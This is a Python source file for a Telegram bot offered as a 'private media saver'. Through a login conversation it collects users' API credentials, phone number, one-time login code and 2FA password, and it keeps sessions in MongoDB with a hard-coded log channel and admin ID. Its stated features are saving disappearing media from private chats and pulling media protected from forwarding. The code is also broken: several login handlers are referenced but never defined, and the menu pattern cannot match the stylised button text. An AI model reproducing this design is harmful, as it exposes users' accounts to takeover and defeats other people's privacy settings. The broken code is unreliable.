import os
import asyncio
import logging
import time
from datetime import datetime
from motor.motor_asyncio import AsyncIOMotorClient
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeInvalidError,
    PhoneCodeExpiredError, ChannelPrivateError
)
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, KeyboardButton
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters, ConversationHandler
)
from dotenv import load_dotenv

load_dotenv()
DEFAULT_API_ID = int(os.getenv("API_ID"))
DEFAULT_API_HASH = os.getenv("API_HASH")
MONGO_URI = os.getenv("MONGO_URI")
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "-1002753939875"))
ADMIN_ID = int(os.getenv("ADMIN_ID", "7755789304"))

WELCOME_IMAGE = "https://graph.org/file/d367814bc3243e72917ab-9f1d63e7b3f46b6716.jpg"
SUPPORT_LINK = "https://t.me/valahallah"

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger("UserBot")

mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client.userbot
sessions = db.sessions

app = ApplicationBuilder().token(BOT_TOKEN).build()
API_ID, API_HASH, PHONE, CODE, PASSWORD, FETCH_LINK = range(6)
user_login_data = {}
user_last_action_time = {}

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ ᴀʟʟ ᴘʀᴏᴄᴇss ᴄᴀɴᴄᴇʟʟᴇᴅ. Nᴏᴡ sᴇɴᴅ /start ᴀɢᴀɪɴ.")
    return ConversationHandler.END

async def spam_protected(user_id):
    now = time.time()
    last = user_last_action_time.get(user_id, 0)
    if now - last < 10:
        return False
    user_last_action_time[user_id] = now

    # Optional memory leak prevention (your suggestion)
    if len(user_last_action_time) > 10000:
        user_last_action_time.clear()

    return True

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    inline_keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("𝗖𝗼𝗻𝗻𝗲𝗰𝘁 𝗬𝗼𝘂𝗿 𝗔𝗰𝗰𝗼𝘂𝗻𝘁", callback_data="connect")],
        [InlineKeyboardButton("🍬𝗦𝗨𝗣𝗣𝗢𝗥𝗧🍬", url=SUPPORT_LINK)]
    ])
    reply_keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton("📥 ᴅᴏᴡɴʟᴏᴀᴅ ɴᴏɴ-ɴᴏʀᴡᴀʀᴅᴀʙʟᴇ ᴍᴇᴅɪᴀ")]],
        resize_keyboard=True
    )
    welcome_text = (
        "<b>✨𝘄𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝗱𝗶𝗮 𝘀𝗮𝘃𝗲𝗿✨</b>\n\n"
        "🔐 <i>sᴇᴄᴜʀᴇʟʏ ᴄᴏɴɴᴇᴄᴛ ʏᴏᴜʀ Tᴇʟᴇɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ .</i>\n\n"
        "<b>⚙️ 𝗳𝗲𝗮𝘁𝘂𝗿𝗲𝘀:</b>\n"
        "• sᴀᴠᴇ ᴅɪsᴀᴘᴘᴇᴀʀɪɴɢ ᴍᴇᴅɪᴀ ғʀᴏᴍ ᴘʀɪᴠᴀᴛᴇ ᴄʜᴀᴛs ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ 📦\n"
        "• ᴅᴏᴡɴʟᴏᴀᴅ ɴᴏɴ-ғᴏʀᴡᴀʀᴅᴀʙʟᴇ ᴄᴏɴᴛᴇɴᴛ ғʀᴏᴍ ɢʀᴏᴜᴘs & ᴄʜᴀɴɴᴇʟs🔓\n"
        "• ʙᴀᴄᴋɢʀᴏᴜɴᴅ ᴘʀᴏᴄᴇssɪɴɢ ᴡɪᴛʜᴏᴜᴛ ɴᴇᴇᴅɪɴɢ ʏᴏᴜʀ ᴍᴀɪɴ ᴘʜᴏɴᴇ  📲\n\n"
        " 𝗽𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 ~ 𝘁𝗲𝗮𝗺 𝘃𝗮𝗹𝗹𝗮𝗵𝗮𝗹𝗹𝗮"
    )
    await update.message.reply_photo(
        photo=WELCOME_IMAGE,
        caption=welcome_text,
        reply_markup=inline_keyboard,
        parse_mode="HTML"
    )
    await update.message.reply_text(
        "☝️ 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗺𝗲𝗻𝘂 𝗯𝗲𝗹𝗼𝘄 𝘁𝗼 𝗳𝗲𝘁𝗰𝗵 𝗻𝗼𝗻-𝗳𝗼𝗿𝘄𝗮𝗿𝗱𝗮𝗯𝗹𝗲 𝗺𝗲𝗱𝗶𝗮.",
        reply_markup=reply_keyboard
    )
async def menu_fetch_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📎 Sᴇɴᴅ ᴛʜᴇ ᴍᴇssᴀɢᴇ ʟɪɴᴋ ғʀᴏᴍ ᴀ ᴄʜᴀɴɴᴇʟ/ɢʀᴏᴜᴘ ʏᴏᴜ'ʀᴇ Jᴏɪɴᴇᴅ ɪɴ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀᴄᴄᴏᴜɴᴛ:\n\n"
        "Exᴀᴍᴘʟᴇ: https://t.me/c/123456789/55 or https://t.me/username/123"
    )
    return FETCH_LINK

async def fetch_from_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if not await spam_protected(user_id):
        await update.message.reply_text("⚠️ Please wait 10 seconds before using this again.")
        return FETCH_LINK

    if user_id not in user_login_data or "client" not in user_login_data[user_id]:
        await update.message.reply_text("⚠️ Yᴏᴜ ɴᴇᴇᴅ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ғɪʀsᴛ ᴜsɪɴɢ /start.")
        return ConversationHandler.END

    client = user_login_data[user_id]["client"]
    try:
        if "t.me/c/" in text:
            parts = text.split("t.me/c/")[1].split("/")
            chat_id = int("-100" + parts[0])
            msg_id = int(parts[1])
        elif "t.me/" in text:
            parts = text.split("t.me/")[1].split("/")
            chat_id = parts[0]
            msg_id = int(parts[1])
        else:
            await update.message.reply_text("❌ Iɴᴠᴀʟɪᴅ ᴍᴇssᴀɢᴇ ʟɪɴᴋ ғᴏʀᴍᴀᴛ.")
            return FETCH_LINK

        entity = await client.get_entity(chat_id)
        message = await client.get_messages(entity, ids=msg_id)

        if not message or not message.media:
            await update.message.reply_text("⚠️ Nᴏ ᴍᴇᴅɪᴀ ғᴏᴜɴᴅ ɪɴ ᴛʜᴀᴛ ᴍᴇssᴀɢᴇ.")
            return ConversationHandler.END

        file = await message.download_media()
        await client.send_file("me", file, caption="📥 Fᴇᴛᴄʜᴇᴅ ғʀᴏᴍ ɴᴏɴ-ғᴏʀᴡᴀʀᴅᴀʙʟᴇ ᴍᴇᴅɪᴀ ʟɪɴᴋ.")
        await update.message.reply_text("✅ Mᴇᴅɪᴀ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ ᴀɴᴅ sᴇɴᴛ ᴛᴏ ʏᴏᴜʀ Sᴀᴠᴇᴅ Mᴇssᴀɢᴇs.")
    except ChannelPrivateError:
        await update.message.reply_text("❌ Yᴏᴜ'ʀᴇ ɴᴏᴛ ᴀ ᴍᴇᴍʙᴇʀ ᴏғ ᴛʜᴀᴛ ᴄʜᴀɴɴᴇʟ.")
    except Exception as e:
        logger.error(f"[FETCH ERROR] {e}")
        await update.message.reply_text("❌ Sᴏᴍᴇᴛʜɪɴɢ ᴡᴇɴᴛ ᴡʀᴏɴɢ. Tʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ.")
    return ConversationHandler.END

# Conversation Handlers
login_conv = ConversationHandler(
    entry_points=[CallbackQueryHandler(connect_callback, pattern="connect")],
    states={
        API_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_api_id), CommandHandler("skip", skip_api_id)],
        API_HASH: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_api_hash), CommandHandler("skip", skip_api_hash)],
        PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
        CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_otp)],
        PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
    },
    fallbacks=[CommandHandler("cancel", cancel)],
    allow_reentry=True
)

fetch_conv = ConversationHandler(
    entry_points=[
        MessageHandler(filters.TEXT & filters.Regex("(?i).*Download Non-Forwardable Media.*"), menu_fetch_request)
    ],
    states={
        FETCH_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, fetch_from_link)]
    },
    fallbacks=[CommandHandler("cancel", cancel)],
)

# Final Setup
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("cancel", cancel))
app.add_handler(login_conv)
app.add_handler(fetch_conv)

print("🤖 Bot is running...")
app.run_polling()    
